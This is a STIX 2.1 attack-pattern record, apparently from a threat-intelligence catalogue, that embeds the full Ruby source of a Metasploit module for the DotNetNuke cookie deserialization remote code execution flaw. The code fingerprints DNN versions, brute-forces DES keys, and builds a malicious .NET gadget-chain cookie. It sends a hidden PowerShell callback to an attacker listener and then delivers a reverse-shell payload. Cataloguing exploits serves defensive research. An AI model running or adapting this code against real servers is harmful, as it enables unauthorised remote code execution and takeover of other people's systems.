{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f8f7e71b-662a-4caf-9315-91712b439dae",
    "created": "2024-08-14T16:54:14.074686Z",
    "modified": "2024-08-14T16:54:14.07469Z",
    "name": "DotNetNuke Cookie Deserialization Remote Code Excecution",
    "description": " This module exploits a deserialization vulnerability in DotNetNuke (DNN) versions 5.0.0 to 9.3.0-RC. Vulnerable versions store profile information for users in the DNNPersonalization cookie as XML. The expected structure includes a \"type\" attribute to instruct the server which type of object to create on deserialization. The cookie is processed by the application whenever it attempts to load the current user's profile data. This occurs when DNN is configured to handle 404 errors with its built-in error page (default configuration). An attacker can leverage this vulnerability to execute arbitrary code on the system.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/dnn_cookie_deserialization_rce.rb",
            "external_id": "dnn_cookie_deserialization_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-9822"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-15811"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-15812"
        },
        {
            "source_name": "reference",
            "url": "https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://googleprojectzero.blogspot.com/2017/04/exploiting-net-managed-dcom.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pwntester/ysoserial.net"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\nrequire 'set'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::Remote::HttpServer\n\n  Rank = ExcellentRanking\n\n  # ==================================\n  # Override the setup method to allow\n  # for delayed handler start\n  # ===================================\n  def setup\n    # Reset the session counts to zero.\n    reset_session_counts\n\n    return if !payload_instance\n    return if !handler_enabled?\n\n    # Configure the payload handler\n    payload_instance.exploit_config = {\n      'active_timeout' => active_timeout\n    }\n\n    # payload handler is normally set up and started here\n    # but has been removed so we can start the handler when needed.\n  end\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'DotNetNuke Cookie Deserialization Remote Code Excecution',\n        'Description' => %q{\n          This module exploits a deserialization vulnerability in DotNetNuke (DNN) versions 5.0.0 to 9.3.0-RC.\n          Vulnerable versions store profile information for users in the DNNPersonalization cookie as XML.\n          The expected structure includes a \"type\" attribute to instruct the server which type of object to create on deserialization.\n          The cookie is processed by the application whenever it attempts to load the current user's profile data.\n          This occurs when DNN is configured to handle 404 errors with its built-in error page (default configuration).\n          An attacker can leverage this vulnerability to execute arbitrary code on the system.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Jon Park', 'Jon Seigel' ],\n        'References' => [\n          [ 'CVE', '2017-9822' ],\n          [ 'CVE', '2018-15811'],\n          [ 'CVE', '2018-15812'],\n          [ 'CVE', '2018-18325'], # due to failure to patch CVE-2018-15811\n          [ 'CVE', '2018-18326'], # due to failure to patch CVE-2018-15812\n          [ 'URL', 'https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf'],\n          [ 'URL', 'https://googleprojectzero.blogspot.com/2017/04/exploiting-net-managed-dcom.html'],\n          [ 'URL', 'https://github.com/pwntester/ysoserial.net']\n        ],\n        'Platform' => 'win',\n        'Targets' => [\n          [ 'Automatic', { 'auto' => true } ],\n          [ 'v5.0 - v9.0.0', { 'ReqEncrypt' => false, 'ReqSession' => false } ],\n          [ 'v9.0.1 - v9.1.1', { 'ReqEncrypt' => false, 'ReqSession' => false } ],\n          [ 'v9.2.0 - v9.2.1', { 'ReqEncrypt' => true, 'ReqSession' => true } ],\n          [ 'v9.2.2 - v9.3.0-RC', { 'ReqEncrypt' => true, 'ReqSession' => true } ]\n        ],\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Privileged' => false,\n        'DisclosureDate' => '2017-07-20',\n        'DefaultOptions' => { 'WfsDelay' => 5 },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    deregister_options('SRVHOST')\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path that will result in the DNN 404 response', '/__']),\n        OptBool.new('DryRun', [false, 'Performs target version check, finds encryption KEY and IV values if required, and outputs a cookie payload', false]),\n        OptString.new('VERIFICATION_PLAIN', [\n          false, %q(The known (full or partial) plaintext of the encrypted verification code.\n        Typically in the format of {portalID}-{userID} where portalID is an integer and userID is either an integer or GUID (v9.2.2+)), ''\n        ]),\n        OptBool.new('ENCRYPTED', [\n          true, %q{Whether or not to encrypt the final payload cookie;\n        (VERIFICATION_CODE and VERIFICATION_PLAIN) or (KEY and IV) are required if set to true.}, false\n        ]),\n        OptString.new('KEY', [false, 'The key to use for encryption.', '']),\n        OptString.new('IV', [false, 'The initialization vector to use for encryption.', '']),\n        OptString.new('SESSION_TOKEN', [\n          false, %q{The .DOTNETNUKE session cookie to use when submitting the payload to the target server.\n        DNN versions 9.2.0+ require the attack to be submitted from an authenticated context.}, ''\n        ]),\n        OptString.new('VERIFICATION_CODE', [\n          false, %q{The encrypted verification code received in a registration email.\n        Can also be the path to a file containing a list of verification codes.}, ''\n        ])\n      ]\n    )\n\n    initialize_instance_variables\n  end\n\n  def initialize_instance_variables\n    # ==================\n    # COMMON VARIABLES\n    # ==================\n\n    @target_idx = 0\n\n    # Flag for whether or not to perform exploitation\n    @dry_run = false\n\n    # Flag for whether or not the target requires encryption\n    @encrypted = false\n\n    # Flag for whether or not to attempt to decrypt the provided verification token(s)\n    @try_decrypt = false\n\n    # ==================\n    # PAYLOAD VARIABLES\n    # ==================\n\n    @cr_regex = /(?<=Copyright \\(c\\) 2002-)(\\d{4})/\n\n    # ==================\n    # v9.1.1+ VARIABLES\n    # ==================\n\n    @key_charset = '02468ABDF'\n    @verification_codes = []\n\n    @iv_regex = /[0-9A-F]{8}/\n\n    # Known plaintext\n    @kpt = ''\n\n    # Encryption objects\n    @decryptor = OpenSSL::Cipher.new('des')\n    @decryptor.decrypt\n\n    @encryptor = OpenSSL::Cipher.new('des')\n    @encryptor.encrypt\n\n    # final passphrase (key +iv) to use for payload (v9.1.1+)\n    @passphrase = ''\n\n    # ==================\n    # v9.2.0+ VARIABLES\n    # ==================\n\n    # Session token needed for exploitation (v9.2.0+)\n    @session_token = ''\n\n    # ==================\n    # v9.2.2+ VARIABLES\n    # ==================\n\n    # User ID format (v9.2.2+)\n    # Number of characters of user ID available in plaintext\n    # is equal to the length of a GUID (no spaces or dashes)\n    # minus (blocksize - known plaintext length).\n    @user_id_pt_length = 32 - (8 - @kpt.length)\n    @user_id_regex = /[0-9a-f]{#{@user_id_pt_length}}/\n\n    # Plaintext found from decryption (v9.2.2+)\n    @found_pt = ''\n\n    @iv_charset = '0123456789abcdef'\n\n    # Possible IVs used to encrypt verification codes (v9.2.2+)\n    @possible_ivs = Set.new([])\n\n    # Possible keys used to encrypt verification codes (v9.2.2+)\n    @possible_keys = Set.new([])\n\n    # passphrases (key + iv) values to use for payload encryption (v9.2.2+)\n    @passphrases = []\n\n    # char sets to use when generating possible base keys\n    @unchanged = Set.new([65, 70])\n  end\n\n  def decode_verification(code)\n    # Decode verification code base don DNN format\n    return String.new(\n      Rex::Text.decode_base64(\n        code.chomp.gsub('.', '+').gsub('-', '/').gsub('_', '=')\n      )\n    )\n  end\n\n  # ==============\n  # Main function\n  # ==============\n  def exploit\n    return unless check == Exploit::CheckCode::Appears\n\n    @encrypted = datastore['ENCRYPTED']\n    verification_code = datastore['VERIFICATION_CODE']\n    if File.file?(verification_code)\n      File.readlines(verification_code).each do |code|\n        @verification_codes.push(decode_verification(code))\n      end\n    else\n      @verification_codes.push(decode_verification(verification_code))\n    end\n\n    @kpt = datastore['VERIFICATION_PLAIN']\n\n    @session_token = datastore['SESSION_TOKEN']\n    @dry_run = datastore['DryRun']\n    key = datastore['KEY']\n    iv = datastore['IV']\n\n    if target['ReqEncrypt'] && @encrypted == false\n      print_warning('Target requires encrypted payload. Exploit may not succeed.')\n    end\n\n    if @encrypted\n      # Requires either supplied key and IV, or verification code and plaintext\n      if (!key.blank? && !iv.blank?)\n        @passphrase = key + iv\n        # Key and IV were supplied, don't try and decrypt.\n        @try_decrypt = false\n      elsif (!@verification_codes.empty? && !@kpt.blank?)\n        @try_decrypt = true\n      else\n        fail_with(Failure::BadConfig, 'You must provide either (VERIFICATION_CODE and VERIFICATION_PLAIN) or (KEY and IV).')\n      end\n    end\n\n    if target['ReqSession'] && @session_token.blank?\n      fail_with(Failure::BadConfig, 'Target requires a valid SESSION_TOKEN for exploitation.')\n    end\n\n    if @encrypted && @try_decrypt\n      # Set IV for decryption as the known plaintext, manually\n      # apply PKCS padding (N bytes of N), and disable padding on the decryptor to increase speed.\n      # For v9.1.1 - v9.2.1 this will find the valid KEY and IV value in real time.\n      # For v9.2.2+ it will find an initial base key faster than if padding were enabled.\n      f8_plain = @kpt[0, 8]\n      c_iv = f8_plain.unpack('C*') + [8 - f8_plain.length] * (8 - f8_plain.length)\n      @decryptor.iv = String.new(c_iv.pack('C*'))\n      @decryptor.padding = 0\n\n      key = find_key(@verification_codes[0])\n      if key.blank?\n        return\n      end\n\n      if @target_idx == 4\n        # target is v9.2.2+, requires base64 generated key and IV values.\n        generate_base_keys(0, key.each_byte.to_a, '')\n        vprint_status(\"Generated #{@possible_keys.size} possible base KEY values from #{key}\")\n\n        # re-enable padding here as it doesn't have the\n        # same performance impact when trying to find possible IV values.\n        @decryptor.padding = 1\n\n        print_warning('Finding possible base IVs. This may take a few minutes...')\n        start = Time.now\n        find_ivs(@verification_codes, key)\n        elapsed = Time.now - start\n        vprint_status(\n          format(\n            'Found %<n_ivs>d potential Base IV values using %<n_codes>d '\\\n            'verification codes in %<e_time>.2f seconds.',\n            n_ivs: @possible_ivs.size,\n            n_codes: @verification_codes.size,\n            e_time: elapsed.to_s\n          )\n        )\n\n        generate_payload_passphrases\n        vprint_status(format('Generated %<n_phrases>d possible base64 KEY and IV combinations.', n_phrases: @passphrases.size))\n      end\n\n      if @passphrase.blank?\n        # test all generated passphrases by\n        # sending an exploit payload to the target\n        # that will callback to an HTTP listener\n        # with the index of the passphrase that worked.\n\n        # set SRVHOST as LHOST value for HTTPServer mixin\n        datastore['SRVHOST'] = datastore['LHOST']\n        print_warning('Trying all possible KEY and IV combinations...')\n        print_status(\"Starting HTTP listener on port #{datastore['SRVPORT']}...\")\n        start_service\n        begin\n          vprint_warning(\"Sending #{@passphrases.count} test Payload(s) to: #{normalize_uri(target_uri.path)}. This may take a few minutes ...\")\n\n          test_passphrases\n\n          # If no working passphrase has been found,\n          # wait to allow the chance for the last one to callback.\n          if @passphrase.empty? && !@dry_run\n            sleep(wfs_delay)\n          end\n        ensure\n          cleanup_service\n        end\n\n        print \"\\r\\n\"\n        if !@passphrase.empty?\n          print_good(\"KEY: #{@passphrase[0, 8]} and IV: #{@passphrase[8..]} found\")\n        end\n      end\n    end\n    send_exploit_payload\n  end\n\n  # =====================\n  # For the check command\n  # =====================\n  def check\n    if target.name == 'Automatic'\n      select_target\n    end\n\n    @target_idx = Integer(datastore['TARGET'])\n\n    if @target_idx == 0\n      fail_with(Failure::NoTarget, 'No valid target found or specified.')\n    end\n\n    # Check if 404 page is custom or not.\n    # Vulnerability requires custom 404 handling (enabled by default).\n    uri = normalize_uri(target_uri.path)\n    print_status(\"Checking for custom error page at: #{uri} ...\")\n    res = send_request_cgi(\n      'uri' => uri\n    )\n\n    if res.code == 404 && !res.body.include?('Server Error') && res.to_s.length > 1600\n      print_good('Custom error page detected.')\n    else\n      print_error('IIS Error Page detected.')\n      return Exploit::CheckCode::Safe\n    end\n    return Exploit::CheckCode::Appears\n  end\n\n  # ===========================\n  # Auto-select target version\n  # ===========================\n  def select_target\n    print_status('Trying to determine DNN Version...')\n    # Check for copyright version in /Documentation/license.txt\n    uri = %r{^(.*[\\\\/])}.match(target_uri.path)[0]\n    vprint_status(\"Checking version at #{normalize_uri(\"#{uri}Documentation\", 'License.txt')} ...\")\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(\"#{uri}Documentation\", 'License.txt')\n    )\n    year = -1\n    if res && res.code == 200\n      # License page found, get latest copyright year.\n      matches = @cr_regex.match(res.body)\n      if matches\n        year = matches[0].to_i\n      end\n    else\n      vprint_status(\"Checking version at #{uri} ...\")\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri' => normalize_uri(uri)\n      )\n      if res && res.code == 200\n        # Check if copyright info is in page HTML.\n        matches = @cr_regex.match(res.body)\n        if matches\n          year = matches[0].to_i\n        end\n      end\n    end\n\n    if year >= 2018\n      print_warning(\n        %q{DNN Version Found: v9.2.0+ - Requires ENCRYPTED and SESSION_TOKEN.\nSetting target to 3 (v9.2.0 - v9.2.1). Site may also be 9.2.2.\nTry setting target 4 and supply a file of of verification codes or specifiy valid Key and IV values.\"}\n      )\n      datastore['TARGET'] = 3\n    elsif year == 2017\n      print_warning('DNN Version Found: v9.0.1 - v9.1.1 - May require ENCRYPTED')\n      datastore['TARGET'] = 2\n    elsif year < 2017 && year > 2008\n      print_good('DNN Version Found: v5.1.0 - v9.0.1')\n      datastore['TARGET'] = 1\n    elsif year == 2008\n      print_warning('DNN Version is either v5.0.0 (vulnerable) or 4.9.x (not vulnerable).')\n      datastore['TARGET'] = 1\n    else\n      print_warning('Could not determine DNN version. Target may still be vulnerable. Manually set the Target value')\n    end\n  end\n\n  # ==============================\n  # Known plaintext attack to\n  # brute-force the encryption key\n  # ==============================\n  def find_key(cipher_text)\n    print_status('Finding Key...')\n\n    # Counter\n    total_keys = @key_charset.length**8\n    i = 1\n\n    # Set start time\n    start = Time.now\n\n    # First char\n    @key_charset.each_byte do |a|\n      key = a.chr\n      # 2\n      @key_charset.each_byte do |b|\n        key[1] = b.chr\n        # 3\n        @key_charset.each_byte do |c|\n          key[2] = c.chr\n          # 4\n          @key_charset.each_byte do |d|\n            key[3] = d.chr\n            # 5\n            @key_charset.each_byte do |e|\n              key[4] = e.chr\n              # 6\n              @key_charset.each_byte do |f|\n                key[5] = f.chr\n                # 7\n                @key_charset.each_byte do |g|\n                  key[6] = g.chr\n                  # 8\n                  @key_charset.each_byte do |h|\n                    key[7] = h.chr\n                    if decrypt_data_and_iv(@decryptor, cipher_text, String.new(key))\n                      elapsed = Time.now - start\n                      print_search_status(i, elapsed, total_keys)\n                      print_line\n                      if @target_idx == 4\n                        print_good(\"Possible Base Key Value Found: #{key}\")\n                      else\n                        print_good(\"KEY Found: #{key}\")\n                        print_good(\"IV Found: #{@passphrase[8..]}\")\n                      end\n                      vprint_status(format('Total number of Keys tried: %<n_tried>d', n_tried: i))\n                      vprint_status(format('Time to crack: %<c_time>.3f seconds', c_time: elapsed.to_s))\n                      return String.new(key)\n                    end\n                    # Print timing info every 5 million attempts\n                    if i % 5000000 == 0\n                      print_search_status(i, Time.now - start, total_keys)\n                    end\n                    i += 1\n                  end\n                end\n              end\n            end\n          end\n        end\n      end\n    end\n    elapsed = Time.now - start\n    print_search_status(i, elapsed, total_keys)\n    print_line\n    print_error('Key not found')\n    vprint_status(format('Total number of Keys tried: %<n_tried>d', n_tried: i))\n    vprint_status(format('Time run: %<r_time>.3f seconds', r_time: elapsed.to_s))\n    return nil\n  end\n\n  # ==================================\n  # Attempt to decrypt a ciphertext\n  # and obtain the IV at the same time\n  # ==================================\n  def decrypt_data_and_iv(cipher, cipher_text, key)\n    cipher.key = key\n    begin\n      plaintext = cipher.update(cipher_text) + cipher.final\n      if @target_idx == 4\n        # Target is v9.2.2+\n        user_id = plaintext[8, @user_id_pt_length]\n        if @user_id_regex.match(user_id)\n          return true\n        end\n\n        return false\n      end\n\n      # This should only execute if the version is 9.1.1 - 9.2.1\n      iv = plaintext[0, 8]\n      if !@iv_regex.match(iv)\n        return false\n      end\n\n      # Build encryption passphrase as DNN does.\n      @passphrase = key + iv\n\n      # Encrypt the plaintext value using the discovered key and IV\n      # and compare with the initial ciphertext\n      if cipher_text == encrypt_data(@encryptor, @kpt, @passphrase)\n        @passphrases.push(String.new(key + iv))\n        return true\n      end\n    rescue StandardError\n      # Ignore decryption errors to allow execution to continue\n      return false\n    end\n    return false\n  end\n\n  def print_search_status(num_tries, elapsed, max_tries)\n    msg = format('Searching at %<s_rate>.3f keys/s ...... %<p_complete>.2f%% of keyspace complete.', s_rate: num_tries / elapsed, p_complete: (num_tries / max_tries.to_f) * 100)\n    print(\"\\r%bld%blu[*]%clr #{msg}\")\n  end\n\n  # ===========================\n  # Encrypt data using the same\n  # pattern that DNN uses.\n  # ===========================\n  def encrypt_data(cipher, message, passphrase)\n    cipher.key = passphrase[0, 8]\n    cipher.iv = passphrase[8, 8]\n    return cipher.update(message) + cipher.final\n  end\n\n  # ===============================================\n  # Generate all possible base key values\n  # used to create the final passphrase in v9.2.2+.\n  # DES weakness allows multiple bytes to be\n  # interpreted as the same value.\n  # ===============================================\n  def generate_base_keys(pos, from_key, new_key)\n    if !@unchanged.include? from_key[pos]\n      if from_key[pos].even?\n        new_key[pos] = (from_key[pos] + 1).chr\n      else\n        new_key[pos] = (from_key[pos] - 1).chr\n      end\n\n      if new_key.length == 8\n        @possible_keys.add(String.new(new_key))\n\n        # also add key with original value\n        new_key[pos] = (from_key[pos]).chr\n        @possible_keys.add(String.new(new_key))\n      else\n        generate_base_keys(pos + 1, from_key, String.new(new_key))\n\n        # also generate keys with original value\n        new_key[pos] = (from_key[pos]).chr\n        generate_base_keys(pos + 1, from_key, String.new(new_key))\n      end\n    else\n      new_key[pos] = (from_key[pos]).chr\n      if new_key.length == 8\n        @possible_keys.add(String.new(new_key))\n      else\n        generate_base_keys(pos + 1, from_key, String.new(new_key))\n      end\n    end\n  end\n\n  # ==============================================\n  # Find all possible base IV values\n  # used to create the final Encryption passphrase\n  # ==============================================\n  def find_ivs(cipher_texts, key)\n    num_chars = 8 - @kpt.length\n    f8regex = /#{@kpt}[0-9a-f]{#{num_chars}}/\n\n    @decryptor.key = key\n    found_pt = @decryptor.update(cipher_texts[0]) + @decryptor.final\n    # Find all possible IVs for the first ciphertext\n    brute_force_ivs(String.new(@kpt), num_chars, cipher_texts[0], key, found_pt[8..])\n\n    # Reduce IV set by testing against other ciphertexts\n    cipher_texts.drop(1).each do |cipher_text|\n      @possible_ivs.each do |iv|\n        @decryptor.iv = iv\n        pt = @decryptor.update(cipher_text) + @decryptor.final\n        if !f8regex.match(pt[0, 8])\n          @possible_ivs.delete(iv)\n        end\n      end\n    end\n  end\n\n  # ==========================================\n  # A recursive function to find all\n  # possible valid IV values using brute-force\n  # ==========================================\n  def brute_force_ivs(pt_prefix, num_chars_needed, cipher_text, key, found_pt)\n    charset = '0123456789abcdef'\n    if num_chars_needed == 0\n      @decryptor.key = key\n      @decryptor.iv = pt_prefix\n      pt = @decryptor.update(cipher_text) + @decryptor.final\n      iv = pt[0, 8]\n      if @iv_regex.match(iv)\n        pt = pt_prefix + found_pt\n        if encrypt_data(@encryptor, pt, key + iv) == cipher_text\n          @possible_ivs.add(String.new(iv))\n        end\n      end\n      return\n    end\n    charset.length.times do |i|\n      brute_force_ivs(String.new(pt_prefix + charset[i]), num_chars_needed - 1, cipher_text, key, found_pt)\n    end\n  end\n\n  # ========================================\n  # Generate all possible payload encryption\n  # passphrases for a v9.2.2+ target\n  # ========================================\n  def generate_payload_passphrases\n    phrases = Set.new(@passphrases)\n    @possible_keys.each do |key|\n      @possible_ivs.each do |iv|\n        phrase = Rex::Text.encode_base64(\n          encrypt_data(@encryptor, key + iv, key + iv)\n        )\n        phrases.add(String.new(phrase[0, 16]))\n      end\n    end\n    @passphrases = phrases.to_a\n  end\n\n  # ===========================================\n  # Test all generated passphrases by initializing\n  # an HTTP server to listen for a callback that\n  # contains the index of the successful passphrase.\n  # ===========================================\n  def test_passphrases\n    for i in 0..@passphrases.size - 1\n      # Stop sending if we've found the passphrase\n      if !@passphrase.empty?\n        break\n      end\n\n      msg = format('Trying KEY and IV combination %<current>d of %<total>d...', current: i + 1, total: @passphrases.size)\n      print(\"\\r%bld%blu[*]%clr #{msg}\")\n\n      url = \"#{get_uri}?#{get_resource.delete('/')}=#{i}\"\n      payload = create_request_payload(url)\n      cookie = create_cookie(payload)\n\n      # Encrypt cookie value\n      enc_cookie = Rex::Text.encode_base64(\n        encrypt_data(@encryptor, cookie, @passphrases[i])\n      )\n      if @dry_run\n        print_line\n        print_warning('DryRun enabled. No exploit payloads have been sent to the target.')\n        print_warning(\"Printing first HTTP callback cookie payload encrypted with KEY: #{@passphrases[i][0, 8]} and IV: #{@passphrases[i][8, 8]}...\")\n        print_line(enc_cookie)\n        break\n      end\n      execute_command(enc_cookie, host: datastore['RHOST'])\n    end\n  end\n\n  # ===============================\n  # Request handler for HTTP server.\n  # ==============================\n  def on_request_uri(cli, request)\n    # Send 404 to prevent scanner detection\n    send_not_found(cli)\n\n    # Get found index - should be the only query string parameter\n    if request.qstring.size == 1 && request.qstring[get_resource.delete('/').to_s]\n      index = request.qstring[get_resource.delete('/').to_s].to_i\n      @passphrase = String.new(@passphrases[index])\n    end\n  end\n\n  # ==============================================\n  # Create payload to callback to the HTTP server.\n  # Note: This technically exploits the\n  # vulnerability, but provides a way to determine\n  # the valid passphrase needed to exploit again.\n  # ==============================================\n  def create_request_payload(url)\n    # Package payload into serialized object\n    payload_object = ::Msf::Util::DotNetDeserialization.generate(\n      \"powershell.exe -nop -w hidden -noni -Command \\\"Invoke-WebRequest '#{url}'\\\"\",\n      gadget_chain: :TypeConfuseDelegate,\n      formatter: :LosFormatter\n    )\n\n    b64_payload = Rex::Text.encode_base64(payload_object)\n    return b64_payload\n  end\n\n  # =================================\n  # Creates the payload cookie\n  # using the specified payload\n  # =================================\n  def create_cookie(payload)\n    cookie = '<profile>'\\\n             '<item key=\"k\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, '\\\n             'System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],'\\\n             '[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, '\\\n             'Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, '\\\n             'Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">'\\\n             '<ExpandedWrapperOfObjectStateFormatterObjectDataProvider>'\\\n             '<ProjectedProperty0>'\\\n             '<MethodName>Deserialize</MethodName>'\\\n             '<MethodParameters>'\\\n             '<anyType xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" '\\\n             'xmlns:d=\"http://www.w3.org/2001/XMLSchema\" i:type=\"d:string\" '\\\n             \">#{payload}</anyType>\"\\\n             '</MethodParameters>'\\\n             '<ObjectInstance xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" '\\\n             'i:type=\"ObjectStateFormatter\" />'\\\n             '</ProjectedProperty0>'\\\n             '</ExpandedWrapperOfObjectStateFormatterObjectDataProvider>'\\\n             '</item>'\\\n             '</profile>'\n    return cookie\n  end\n\n  # =========================================\n  # Send the payload to the target server.\n  # =========================================\n  def execute_command(cookie_payload, opts = { dnn_host: host, dnn_port: port })\n    uri = normalize_uri(target_uri.path)\n\n    res = send_request_cgi(\n      'uri' => uri,\n      'cookie' => \".DOTNETNUKE=#{@session_token};DNNPersonalization=#{cookie_payload};\"\n    )\n    if !res\n      fail_with(Failure::Unreachable, \"#{opts[:host]} - target unreachable.\")\n    elsif res.code == 404\n      return true\n    elsif res.code == 400\n      fail_with(Failure::BadConfig, \"#{opts[:host]} - payload resulted in a bad request - #{res.body}\")\n    else\n      fail_with(Failure::Unknown, \"#{opts[:host]} - Something went wrong- #{res.body}\")\n    end\n  end\n\n  # ======================================\n  # Create and send final exploit payload\n  # to obtain a reverse shell.\n  # ======================================\n  def send_exploit_payload\n    cmd_payload = create_payload\n    cookie_payload = create_cookie(cmd_payload)\n    if @encrypted\n      if @passphrase.blank?\n        print_error('Target requires encrypted payload, but a passphrase was not found or specified.')\n        return\n      end\n      cookie_payload = Rex::Text.encode_base64(\n        encrypt_data(@encryptor, cookie_payload, @passphrase)\n      )\n    end\n    if @dry_run\n      print_warning('DryRun enabled. No exploit payloads have been sent to the target.')\n      print_warning('Printing exploit cookie payload...')\n      print_line(cookie_payload)\n      return\n    end\n\n    # Set up the payload handlers\n    payload_instance.setup_handler\n\n    # Start the payload handler\n    payload_instance.start_handler\n\n    print_status(\"Sending Exploit Payload to: #{normalize_uri(target_uri.path)} ...\")\n    execute_command(cookie_payload, host: datastore['RHOST'])\n  end\n\n  # ===================================\n  # Create final exploit payload based on\n  # supplied payload options.\n  # ===================================\n  def create_payload\n    # Create payload\n    payload_object = ::Msf::Util::DotNetDeserialization.generate(\n      cmd_psh_payload(\n        payload.encoded,\n        payload_instance.arch.first,\n        remove_comspec: true, encode_final_payload: false\n      ),\n      gadget_chain: :TypeConfuseDelegate,\n      formatter: :LosFormatter\n    )\n\n    b64_payload = Rex::Text.encode_base64(payload_object)\n    vprint_status('Payload Object Created.')\n    return b64_payload\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-07-20",
    "x_mitre_platforms": [
        "win'"
    ]
}